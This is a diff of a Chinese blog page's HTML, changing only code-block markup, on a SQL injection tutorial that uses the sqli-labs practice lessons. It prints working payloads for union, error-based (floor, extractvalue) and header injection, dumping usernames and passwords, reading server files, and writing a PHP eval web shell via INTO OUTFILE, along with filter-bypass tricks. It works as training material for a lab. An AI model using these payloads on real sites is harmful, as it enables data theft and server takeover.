@@ -11,7 +11,11 @@
     <meta name="google" content="notranslate">
     <meta name="keywords" content="TriDiamond Obsidian,"> 
     <meta name="description" content="（一）基础知识点union查询（1）系统函数
-version()：mysql版本user()：数据库用户名database()：当前数据库名@@datadir：数据库路径@@version_comp,"> 
+version()：mysql版本
+user()：数据库用户名
+database()：当前数据库名
+@@datadir：数据库路径
+@@version_,"> 
     <meta name="author" content="Knlvre"> 
     <link rel="alternative" href="atom.xml" title="Knlvre" type="application/atom+xml"> 
     <link rel="icon" href="knlvre.github.io/img/favicon.png"> 
@@ -85,13 +89,13 @@ version()：mysql版本user()：数据库用户名database()：当前数据库�
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>Words count</i>
-                    21k
+                    17k
                 </span>
                 
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
-                    19 mins.
+                    16 mins.
                 </span>
                 
                 
@@ -126,20 +130,41 @@ version()：mysql版本user()：数据库用户名database()：当前数据库�
     <div class='main'>
         <div class="content markdown animated fadeIn">
             <h1 id="（一）基础知识点"><a href="#（一）基础知识点" class="headerlink" title="（一）基础知识点"></a>（一）基础知识点</h1><h2 id="union查询"><a href="#union查询" class="headerlink" title="union查询"></a>union查询</h2><p>（1）系统函数</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">version()：mysql版本</span><br><span class="line">user()：数据库用户名</span><br><span class="line">database()：当前数据库名</span><br><span class="line">@@datadir：数据库路径</span><br><span class="line">@@version_compile_os：当前操作系统</span><br></pre></td></tr></table></figure>
-<p>（2）Mysql默认设置</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">information_schema.schemate：默认数据库</span><br><span class="line">information_schema.tables：默认数据表</span><br><span class="line">information_schema.columns：默认字段</span><br></pre></td></tr></table></figure>
-<p>（3）一般用于尝试的语句：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">or 1=1 --+</span><br><span class="line">&apos; or 1=1 --+</span><br><span class="line">&quot; or 1=1 --+</span><br><span class="line">) or 1=1 --+</span><br><span class="line">&apos;) or 1=1 --+</span><br></pre></td></tr></table></figure>
-<p>（4）一般代码为：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$id=$_GET[&apos;id&apos;]</span><br><span class="line">$sql = &quot;select * from table_name where id = &apos;$id&apos; limit 0,1&quot;;</span><br></pre></td></tr></table></figure>
-<p>（5）Union操作符</p>
+<pre><code>version()：mysql版本
+user()：数据库用户名
+database()：当前数据库名
+@@datadir：数据库路径
+@@version_compile_os：当前操作系统
+</code></pre><p>（2）Mysql默认设置</p>
+<pre><code>information_schema.schemate：默认数据库
+information_schema.tables：默认数据表
+information_schema.columns：默认字段
+</code></pre><p>（3）一般用于尝试的语句：</p>
+<pre><code>or 1=1 --+
+&#39; or 1=1 --+
+&quot; or 1=1 --+
+) or 1=1 --+
+&#39;) or 1=1 --+
+</code></pre><p>（4）一般代码为：</p>
+<pre><code>$id=$_GET[&#39;id&#39;]
+$sql = &quot;select * from table_name where id = &#39;$id&#39; limit 0,1&quot;;
+</code></pre><p>（5）Union操作符</p>
 <p>Union操作符用于闭合两个或多个select语句的结果集。Ps：union语句前后列的数量相同，数据类型相同</p>
 <p>（6）Order by *</p>
 <p>*为任意数字，用来测试数字段数，页面返回错误则猜测错误，继续猜测知道相邻数字页面返回正确的为字段个数</p>
 <h2 id="截取字符串"><a href="#截取字符串" class="headerlink" title="截取字符串"></a>截取字符串</h2><p>（1）函数</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">substr(string,start,length)</span><br><span class="line">mid(string,start,length)</span><br><span class="line">left(string,length)</span><br><span class="line">ord()：转换ascii值</span><br><span class="line">limit 0,1：表示从第0个开始去1个，两个数值均可以更改</span><br><span class="line"></span><br><span class="line">Ps:</span><br><span class="line">string：要截取的字符串</span><br><span class="line">start：指定截取开始位置</span><br><span class="line">length：截取个数</span><br><span class="line">left()函数默认从左边第一个开始截取</span><br></pre></td></tr></table></figure>
-<h2 id="REGXP正则匹配"><a href="#REGXP正则匹配" class="headerlink" title="REGXP正则匹配"></a>REGXP正则匹配</h2><p>（1）Limit 0,1：从第0个开始取一个</p>
+<pre><code>substr(string,start,length)
+mid(string,start,length)
+left(string,length)
+ord()：转换ascii值
+limit 0,1：表示从第0个开始去1个，两个数值均可以更改
+
+Ps:
+string：要截取的字符串
+start：指定截取开始位置
+length：截取个数
+left()函数默认从左边第一个开始截取
+</code></pre><h2 id="REGXP正则匹配"><a href="#REGXP正则匹配" class="headerlink" title="REGXP正则匹配"></a>REGXP正则匹配</h2><p>（1）Limit 0,1：从第0个开始取一个</p>
 <p>（2）正则匹配过程：</p>
 <p>^[a-z] ==&gt; ^a[a-z] ==&gt; ^ad[a-z] ==&gt; ^admin$</p>
 <p>首先测试表名以a-z的其中一个字母开头，如果正确，继续测试第二、第三…个字母，最终得到表明，用^符号测试开头，用$符号测试结尾</p>
@@ -174,8 +199,10 @@ version()：mysql版本user()：数据库用户名database()：当前数据库�
 <hr>
 <h1 id="（三）floor报错注入"><a href="#（三）floor报错注入" class="headerlink" title="（三）floor报错注入"></a>（三）floor报错注入</h1><h2 id="【原理】-1"><a href="#【原理】-1" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）关键字：count()，floor()，rand()</p>
 <p>（2）函数介绍</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">count()：是用来统计表中或数组中记录的一个函数</span><br><span class="line">rand()：调用可以在0和1之间产生一个随机数</span><br><span class="line">floor()：函数只返回整数部分，小数部分舍弃</span><br></pre></td></tr></table></figure>
-<p>（3）报错是因为floor(rand(0)×2)的不确定性，group by floor(rand(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(rand(0)×2)可能为0，也可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值</p>
+<pre><code>count()：是用来统计表中或数组中记录的一个函数
+rand()：调用可以在0和1之间产生一个随机数
+floor()：函数只返回整数部分，小数部分舍弃
+</code></pre><p>（3）报错是因为floor(rand(0)×2)的不确定性，group by floor(rand(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(rand(0)×2)可能为0，也可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值</p>
 <h2 id="【步骤】-1"><a href="#【步骤】-1" class="headerlink" title="【步骤】"></a>【步骤】</h2><p>一、Floor函数</p>
 <p>1.1 sqli-labs-master/Less-5</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E4%B8%89%EF%BC%89Floor%E6%8A%A5%E9%94%99/1-1.png" alt="1-1"></p>
@@ -185,13 +212,13 @@ version()：mysql版本user()：数据库用户名database()：当前数据库�
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E4%B8%89%EF%BC%89Floor%E6%8A%A5%E9%94%99/1-3.png" alt="1-3"></p>
 <p>1.4 floor报错注入</p>
 <p>可通过报错注入或者构造逻辑语句，本次采用报错注入。测试数据版本号：5.5.471</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=1&apos; and (select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))) --+</span><br></pre></td></tr></table></figure>
-<p>1.5 查看当前数据库</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=1&apos; and (select 1 from (select count(*),concat((select (select concat(0x7e,database(),0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E4%B8%89%EF%BC%89Floor%E6%8A%A5%E9%94%99/1-5.png" alt="1-5"></p>
+<pre><code>?id=1&#39; and (select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))) --+
+</code></pre><p>1.5 查看当前数据库</p>
+<pre><code>?id=1&#39; and (select 1 from (select count(*),concat((select (select concat(0x7e,database(),0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E4%B8%89%EF%BC%89Floor%E6%8A%A5%E9%94%99/1-5.png" alt="1-5"></p>
 <p>1.6 查看其他数据库</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=1&apos; and (select 1 from (select count(*),concat((select (select (select distinct concat(0x7e,schema_name,0x7e) from information_schema.schemata limit 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>
-<hr>
+<pre><code>?id=1&#39; and (select 1 from (select count(*),concat((select (select (select distinct concat(0x7e,schema_name,0x7e) from information_schema.schemata limit 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+
+</code></pre><hr>
 <h1 id="（四）Xpath报错注入"><a href="#（四）Xpath报错注入" class="headerlink" title="（四）Xpath报错注入"></a>（四）Xpath报错注入</h1><h2 id="【原理】-2"><a href="#【原理】-2" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）关键字：extractvalue()</p>
 <p>（2）extractvalue()：从目标XML中返回包含所查询值的字符串</p>
 <p>extractvalue(XML_document，XPath_string)；</p>
@@ -206,46 +233,58 @@ version()：mysql版本user()：数据库用户名database()：当前数据库�
 <p>1.3 刷新页面，可以看到要执行的SQL语句</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E5%9B%9B%EF%BC%89Xpath%E6%8A%A5%E9%94%99/1-3.png" alt="1-3"></p>
 <p>1.4 Xpath报错注入</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=1&apos; and extractvalue(1,concat(0x7e,(version()),0x7e))--+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E5%9B%9B%EF%BC%89Xpath%E6%8A%A5%E9%94%99/1-4.png" alt="1-4"></p>
+<pre><code>?id=1&#39; and extractvalue(1,concat(0x7e,(version()),0x7e))--+
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E5%9B%9B%EF%BC%89Xpath%E6%8A%A5%E9%94%99/1-4.png" alt="1-4"></p>
 <p>1.5 查看数据库名称</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=1&apos; and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata limit 1,1),0x7e))--+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E5%9B%9B%EF%BC%89Xpath%E6%8A%A5%E9%94%99/1-5.png" alt="1-5"></p>
+<pre><code>?id=1&#39; and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata limit 1,1),0x7e))--+
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E5%9B%9B%EF%BC%89Xpath%E6%8A%A5%E9%94%99/1-5.png" alt="1-5"></p>
 <p>1.6 查看数据表users的字段</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=1&apos; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;),0x7e))--+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E5%9B%9B%EF%BC%89Xpath%E6%8A%A5%E9%94%99/1-6.png" alt="1-6"></p>
+<pre><code>?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),0x7e))--+
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E5%9B%9B%EF%BC%89Xpath%E6%8A%A5%E9%94%99/1-6.png" alt="1-6"></p>
 <p>1.7 查看字段的内容</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=1&apos; and extractvalue(1,concat(0x7e,(select group_concat(username,password) from users where id=1),0x7e))--+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E5%9B%9B%EF%BC%89Xpath%E6%8A%A5%E9%94%99/1-7.png" alt="1-7"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=1&apos; and extractvalue(1,concat(0x7e,(select group_concat(username,password) from users where id=2),0x7e))--+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E5%9B%9B%EF%BC%89Xpath%E6%8A%A5%E9%94%99/1-8.png" alt="1-8"></p>
+<pre><code>?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(username,password) from users where id=1),0x7e))--+
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E5%9B%9B%EF%BC%89Xpath%E6%8A%A5%E9%94%99/1-7.png" alt="1-7"></p>
+<pre><code>?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(username,password) from users where id=2),0x7e))--+
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E5%9B%9B%EF%BC%89Xpath%E6%8A%A5%E9%94%99/1-8.png" alt="1-8"></p>
 <hr>
 <h1 id="（五）文件操作"><a href="#（五）文件操作" class="headerlink" title="（五）文件操作"></a>（五）文件操作</h1><h2 id="【原理】-3"><a href="#【原理】-3" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）关键词：load_file(file_name)</p>
 <p>（2）环境：读取权限且文件完全可读、绝对路径（php配置为display_errors=on只需提交错误请求就会报出绝对路径）、文件小于服务器上设置max_allowed_packet</p>
 <h2 id="【步骤】-3"><a href="#【步骤】-3" class="headerlink" title="【步骤】"></a>【步骤】</h2><h3 id="一、文件操作"><a href="#一、文件操作" class="headerlink" title="一、文件操作"></a>一、文件操作</h3><p>1.1 sqli-labs-master/Less-1</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E4%BA%94%EF%BC%89%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/1-1.png" alt="1-1"></p>
 <p>1.2 查看用户权限，返回正常则说明有读写权限</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=1&apos; and (select count(*) from mysql.user)&gt;0 --+</span><br></pre></td></tr></table></figure>
-<p>1.3 在C盘创建boot.ini，随意写入内容做测试</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,load_file(&quot;c:/boot.ini&quot;)--+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E4%BA%94%EF%BC%89%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/1-3.png" alt="1-3"></p>
+<pre><code>?id=1&#39; and (select count(*) from mysql.user)&gt;0 --+
+</code></pre><p>1.3 在C盘创建boot.ini，随意写入内容做测试</p>
+<pre><code>?id=-1&#39; union select 1,2,load_file(&quot;c:/boot.ini&quot;)--+
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E4%BA%94%EF%BC%89%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/1-3.png" alt="1-3"></p>
 <p>1.4 通过编码读取</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,load_file(0x633a2f626f6f742e696e69)--+</span><br><span class="line"></span><br><span class="line">0x633a2f626f6f742e696e69 == &quot;c:/boot.ini&quot;   16制编码</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E4%BA%94%EF%BC%89%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/1-4.png" alt="1-4"></p>
+<pre><code>?id=-1&#39; union select 1,2,load_file(0x633a2f626f6f742e696e69)--+
+
+0x633a2f626f6f742e696e69 == &quot;c:/boot.ini&quot;   16制编码
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E4%BA%94%EF%BC%89%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/1-4.png" alt="1-4"></p>
 <p>1.5 通过注入方法在网站根目录生成一句话木马</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,(&apos;&lt;?php @eval($_POST[HSW])?&gt;&apos;) into outfile &apos;c:\\phpstudy\\www\\1.php&apos; --+</span><br></pre></td></tr></table></figure>
-<p>页面没有任何返回信息</p>
+<pre><code>?id=-1&#39; union select 1,2,(&#39;&lt;?php @eval($_POST[HSW])?&gt;&#39;) into outfile &#39;c:\\phpstudy\\www\\1.php&#39; --+
+</code></pre><p>页面没有任何返回信息</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E4%BA%94%EF%BC%89%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/1-5.png" alt="1-5"></p>
 <p>1.6 但是不代表没有上传成功</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E4%BA%94%EF%BC%89%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/1-6.png" alt="1-6"></p>
 <hr>
 <h1 id="（六）绕过"><a href="#（六）绕过" class="headerlink" title="（六）绕过"></a>（六）绕过</h1><h2 id="【原理】-4"><a href="#【原理】-4" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）空格（根据环境有所不同）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%09：tab键（水平）</span><br><span class="line">%0b：tab键（垂直）</span><br><span class="line">%0a：新建一行</span><br><span class="line">%0c：新的一页</span><br><span class="line">%0d：return功能</span><br><span class="line">%a0：空格</span><br></pre></td></tr></table></figure>
-<p>（2）宽字节</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">原理：编码不同</span><br><span class="line">代码处理方式：将 &apos; 退义后 输出为\&apos;</span><br><span class="line">可通过 %df 形成 %df%5c 在gbk中为文字</span><br><span class="line">此外还可以通过utf-8、utf-16、utf-32等编码转换</span><br><span class="line">如 %ef%bf%bd 形成 %ef%bf%bd%c</span><br></pre></td></tr></table></figure>
-<p>（3）and/or</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and 可以用 &amp;&amp; 代替</span><br><span class="line">or 可以用 || 代替</span><br></pre></td></tr></table></figure>
-<h2 id="【步骤】-4"><a href="#【步骤】-4" class="headerlink" title="【步骤】"></a>【步骤】</h2><h3 id="一、空格"><a href="#一、空格" class="headerlink" title="一、空格"></a>一、空格</h3><p>1.1 sqli-labs-master/Less-26</p>
+<pre><code>%09：tab键（水平）
+%0b：tab键（垂直）
+%0a：新建一行
+%0c：新的一页
+%0d：return功能
+%a0：空格
+</code></pre><p>（2）宽字节</p>
+<pre><code>原理：编码不同
+代码处理方式：将 &#39; 退义后 输出为\&#39;
+可通过 %df 形成 %df%5c 在gbk中为文字
+此外还可以通过utf-8、utf-16、utf-32等编码转换
+如 %ef%bf%bd 形成 %ef%bf%bd%c
+</code></pre><p>（3）and/or</p>
+<pre><code>and 可以用 &amp;&amp; 代替
+or 可以用 || 代替
+</code></pre><h2 id="【步骤】-4"><a href="#【步骤】-4" class="headerlink" title="【步骤】"></a>【步骤】</h2><h3 id="一、空格"><a href="#一、空格" class="headerlink" title="一、空格"></a>一、空格</h3><p>1.1 sqli-labs-master/Less-26</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E5%85%AD%EF%BC%89%E7%BB%95%E8%BF%87/1-1.png" alt="1-1"></p>
 <p>1.2 本关对ID的处理</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E5%85%AD%EF%BC%89%E7%BB%95%E8%BF%87/1-2.png" alt="1-2"></p>
@@ -253,19 +292,19 @@ version()：mysql版本user()：数据库用户名database()：当前数据库�
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E5%85%AD%EF%BC%89%E7%BB%95%E8%BF%87/1-3.png" alt="1-3"></p>
 <p>1.4 绕过</p>
 <p>由于 <code>减号-</code> 和 <code>井号#</code> 都被替换掉了，所以选择 <code>逻辑或||</code> 闭合掉后面的单引号</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=-1&apos;%0bunion%0bselect%0b1,2,3||&apos;1</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E5%85%AD%EF%BC%89%E7%BB%95%E8%BF%87/1-4.png" alt="1-4"></p>
+<pre><code>?id=-1&#39;%0bunion%0bselect%0b1,2,3||&#39;1
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E5%85%AD%EF%BC%89%E7%BB%95%E8%BF%87/1-4.png" alt="1-4"></p>
 <h3 id="二、宽字节"><a href="#二、宽字节" class="headerlink" title="二、宽字节"></a>二、宽字节</h3><p>2.1 sqli-labs-master/Less-32</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E5%85%AD%EF%BC%89%E7%BB%95%E8%BF%87/2-1.png" alt="2-1"></p>
 <p>2.2 本关对ID的处理</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E5%85%AD%EF%BC%89%E7%BB%95%E8%BF%87/2-2.png" alt="2-2"></p>
 <p>2.3 输入正常union语句，报错</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=-1&apos; union select 1,database(),3 --+</span><br></pre></td></tr></table></figure>
-<p>单引号、双引号以及反斜杠被转义</p>
+<pre><code>?id=-1&#39; union select 1,database(),3 --+
+</code></pre><p>单引号、双引号以及反斜杠被转义</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E5%85%AD%EF%BC%89%E7%BB%95%E8%BF%87/2-3.png" alt="2-3"></p>
 <p>2.4 用 %df 吃掉符号 ‘\‘</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=-1%df&apos; union select 1,database(),3 --+</span><br></pre></td></tr></table></figure>
-<p>成功弹出数据库名为security</p>
+<pre><code>?id=-1%df&#39; union select 1,database(),3 --+
+</code></pre><p>成功弹出数据库名为security</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E5%85%AD%EF%BC%89%E7%BB%95%E8%BF%87/2-4.png" alt="2-4"></p>
 <hr>
 <h1 id="（七）HTTP头部信息"><a href="#（七）HTTP头部信息" class="headerlink" title="（七）HTTP头部信息"></a>（七）HTTP头部信息</h1><h2 id="【原理】-5"><a href="#【原理】-5" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）User agent：描述浏览器信息</p>
@@ -281,8 +320,8 @@ version()：mysql版本user()：数据库用户名database()：当前数据库�
 <p>再次提交表单，使用Live http headers查看，单击选择最上面的一行，点击Replay，可以看到新的弹框出现</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E4%B8%83%EF%BC%89HTTP%E5%A4%B4%E9%83%A8%E4%BF%A1%E6%81%AF/1-5.png" alt="1-5"></p>
 <p>1.6 在新的弹框中，修改User-agent字段的值</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos; and extractvalue(1,concat(0x7e.(select @@version),0x7e)) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E4%B8%83%EF%BC%89HTTP%E5%A4%B4%E9%83%A8%E4%BF%A1%E6%81%AF/1-6.png" alt="1-6"></p>
+<pre><code>&#39; and extractvalue(1,concat(0x7e.(select @@version),0x7e)) and &#39;1&#39;=&#39;1
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E4%B8%83%EF%BC%89HTTP%E5%A4%B4%E9%83%A8%E4%BF%A1%E6%81%AF/1-6.png" alt="1-6"></p>
 <p>1.7 修改成Xpath报错语法查看版本信息</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/%EF%BC%88%E4%B8%83%EF%BC%89HTTP%E5%A4%B4%E9%83%A8%E4%BF%A1%E6%81%AF/1-7.png" alt="1-7"></p>
 <p>1.8 查看网页，多了一行信息</p>
